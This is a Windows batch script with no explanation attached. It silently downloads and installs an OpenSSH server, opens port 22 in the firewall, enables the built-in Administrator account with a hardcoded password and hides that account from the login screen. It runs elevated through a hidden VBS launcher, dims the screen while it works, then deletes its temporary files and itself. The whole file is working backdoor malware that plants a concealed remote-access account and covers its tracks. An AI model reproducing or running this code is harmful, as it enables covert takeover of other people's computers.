@echo off
echo Invoke-WebRequest -Uri 'https://github.com/a7ecc/OpenSSH/raw/main/OpenSSH.zip' -OutFile '%temp%\OpenSSH.zip'> "%temp%\run.ps1"
echo Expand-Archive '%temp%\OpenSSH.zip' -DestinationPath '%systemdrive%\Program Files\OpenSSH'>> "%temp%\run.ps1"
echo cd "%systemdrive%\Program Files\OpenSSH">> "%temp%\run.ps1"
echo powershell.exe -ExecutionPolicy Bypass -File ".\install-sshd.ps1">> "%temp%\run.ps1"
echo del "%temp%\OpenSSH.zip">> "%temp%\run.ps1"
echo Start-Service sshd >> "%temp%\run.ps1"
echo Set-Service -Name sshd -StartupType 'Automatic' >> "%temp%\run.ps1"
echo if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue ^| Select-Object Name, Enabled)) { >> "%temp%\run.ps1"
echo     Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..." >> "%temp%\run.ps1"
echo     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 >> "%temp%\run.ps1"
echo } else { >> "%temp%\run.ps1"
echo     Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists." >> "%temp%\run.ps1"
echo } >> "%temp%\run.ps1"
echo powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,30)">"%temp%\run.bat"
echo taskkill /f /im powershell.exe >>"%temp%\run.bat"
echo powershell.exe -ExecutionPolicy Bypass -File "%temp%\run.ps1">>"%temp%\run.bat"
echo net user Administrator /active:yes>>"%temp%\run.bat"
echo net user Administrator 55991133>>"%temp%\run.bat"
echo reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Administrator>>"%temp%\run.bat"
echo netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes>>"%temp%\run.bat"
echo del "%temp%\run.ps1">>"%temp%\run.bat"
echo del "%temp%\run.vbs">>"%temp%\run.bat"
echo powershell -Command "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,100)">>"%temp%\run.bat"
echo del "%temp%\run.bat" >>"%temp%\run.bat"
echo If Not WScript.Arguments.Named.Exists("elevate") Then>"%temp%\run.vbs"
echo   CreateObject("Shell.Application").ShellExecute WScript.FullName _>>"%temp%\run.vbs"
echo     , """" ^& WScript.ScriptFullName ^& """ /elevate", "", "runas", ^1>>"%temp%\run.vbs"
echo   WScript.Quit>>"%temp%\run.vbs"
echo End If>>"%temp%\run.vbs"
echo Set WshShell = CreateObject("WScript.Shell")>>"%temp%\run.vbs"
echo WshShell.Run """" ^& "%temp%\run.bat" ^& """" ^& sargs, 0, False>>"%temp%\run.vbs"
echo Set WshShell = Nothing>>"%temp%\run.vbs"
cd "%temp%"
start run.vbs
del %0 | exit
